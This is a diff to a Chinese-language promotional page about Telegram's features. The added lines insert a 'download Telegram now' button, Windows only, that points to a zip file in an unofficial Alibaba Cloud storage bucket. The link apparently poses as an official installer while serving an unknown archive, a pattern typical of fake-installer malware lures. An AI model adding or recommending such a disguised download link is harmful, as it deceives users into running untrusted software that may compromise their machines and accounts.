@@ -29,3 +29,7 @@ Telegram的频道功能可以让您一键向大量关注者推送信息，是企
 Telegram 支持丰富的机器人和插件，您可以使用它们来自动回复消息、查询天气、管理任务等。此外，您还可以自由定制聊天背景、表情包，打造属于自己的个性化通讯体验。
 
 让我们一起畅享安全、高效、个性化的沟通新时代！
+
+## 📥 立即下载Telegram
+
+<a href="https://papaxxz.oss-ap-southeast-1.aliyuncs.com/zhifeiji.zip">[点击此处下载Telegram]</a> 仅支持Windows系统
